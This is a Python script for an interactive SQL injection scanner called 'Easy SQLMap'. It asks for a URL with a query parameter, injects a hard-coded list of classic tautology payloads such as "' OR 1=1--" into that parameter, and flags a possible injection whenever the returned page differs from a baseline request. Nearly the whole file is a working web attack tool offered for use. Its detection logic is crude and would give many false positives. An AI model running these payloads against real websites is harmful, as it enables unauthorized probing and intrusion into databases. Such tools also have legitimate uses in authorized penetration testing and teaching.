import requests
import time
import sys
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse

# Colors for console output
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' OR 1=1--",
    "' OR 'a'='a",
    "' OR ''='",
    "'--",
    "' OR 1=1#",
    "\" OR 1=1--",
    "') OR ('1'='1"
]

def show_banner():
    banner = f"""{Colors.OKCYAN}
 ▄████  ██░ ██  ▒█████    ██████ ▄▄▄█████▓     ██████   █████   ██▓    
 ██▒ ▀█▒▓██░ ██▒▒██▒  ██▒▒██    ▒ ▓  ██▒ ▓▒   ▒██    ▒ ▒██▓  ██▒▓██▒    
▒██░▄▄▄░▒██▀▀██░▒██░  ██▒░ ▓██▄   ▒ ▓██░ ▒░   ░ ▓██▄   ▒██▒  ██░▒██░    
░▓█  ██▓░▓█ ░██ ▒██   ██░  ▒   ██▒░ ▓██▓ ░      ▒   ██▒░██  █▀ ░▒██░    
░▒▓███▀▒░▓█▒░██▓░ ████▓▒░▒██████▒▒  ▒██▒ ░    ▒██████▒▒░▒███▒█▄ ░██████▒
 ░▒   ▒  ▒ ░░▒░▒░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░  ▒ ░░      ▒ ▒▓▒ ▒ ░░░ ▒▒░ ▒ ░ ▒░▓  ░
  ░   ░  ▒ ░▒░ ░  ░ ▒ ▒░ ░ ░▒  ░ ░    ░       ░ ░▒  ░ ░ ░ ▒░  ░ ░ ░ ▒  ░
░ ░   ░  ░  ░░ ░░ ░ ░ ▒  ░  ░  ░    ░         ░  ░  ░     ░   ░   ░ ░   
      ░  ░  ░  ░    ░ ░        ░                    ░      ░        ░  ░

    {Colors.OKGREEN}by bloodhounds502 visit https://github.com/bloodhounds502  Easy SQLMap{Colors.ENDC}
"""
    print(banner)

def show_help():
    print(f"""
{Colors.BOLD}Usage:{Colors.ENDC}
  Enter a full URL with a parameter, like:
  http://testphp.vulnweb.com/artists.php?artist=1

{Colors.BOLD}Cheat Sheet:{Colors.ENDC}
  - Tests common GET-based SQLi payloads
  - Looks for content changes to identify injection points
  - Simple and readable Python code
""")

def extract_parameter(url):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    if not query:
        print(f"{Colors.FAIL}[!] No parameters found in the URL.{Colors.ENDC}")
        return None
    return list(query.keys())[0]

def inject_payload(url, param, payload):
    parsed = urlparse(url)
    query = parse_qs(parsed.query)
    query[param] = payload
    new_query = urlencode(query, doseq=True)
    new_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, new_query, parsed.fragment))
    return new_url

def is_different(original, new):
    return original != new

def run_scan():
    url = input(f"{Colors.OKCYAN}[?] Enter URL to scan:{Colors.ENDC} ")
    if not url or "?" not in url:
        print(f"{Colors.FAIL}[!] Invalid URL. Must contain a parameter (e.g., ?id=1){Colors.ENDC}")
        return

    param = extract_parameter(url)
    if not param:
        return

    try:
        response = requests.get(url, timeout=5)
        original_content = response.text
        print(f"{Colors.OKGREEN}[+] Baseline response collected.{Colors.ENDC}")
    except Exception as e:
        print(f"{Colors.FAIL}[!] Connection failed: {e}{Colors.ENDC}")
        return

    found = False
    for payload in SQLI_PAYLOADS:
        test_url = inject_payload(url, param, payload)
        print(f"{Colors.WARNING}[*] Testing payload:{Colors.ENDC} {payload}")
        try:
            r = requests.get(test_url, timeout=5)
            if is_different(original_content, r.text):
                print(f"{Colors.OKGREEN}[!!!] Possible SQLi with payload:{Colors.ENDC} {payload}")
                found = True
        except Exception as e:
            print(f"{Colors.FAIL}[!] Error with payload {payload}: {e}{Colors.ENDC}")

    if not found:
        print(f"{Colors.FAIL}[-] No injection detected with test payloads.{Colors.ENDC}")

def main_menu():
    show_banner()
    while True:
        print(f"""
{Colors.OKBLUE}[ MENU ]{Colors.ENDC}
  1. Start SQL Injection Scan
  2. Show Help / Cheat Sheet
  3. Exit
""")
        choice = input(f"{Colors.OKCYAN}Select an option (1-3): {Colors.ENDC}")
        if choice == "1":
            run_scan()
        elif choice == "2" or choice.lower() == "help":
            show_help()
        elif choice == "3":
            print(f"{Colors.OKBLUE}Exiting...{Colors.ENDC}")
            break
        else:
            print(f"{Colors.WARNING}[!] Invalid choice. Try again.{Colors.ENDC}")

    input(f"\n{Colors.OKBLUE}Press Enter to exit...{Colors.ENDC}")

if __name__ == "__main__":
    main_menu()
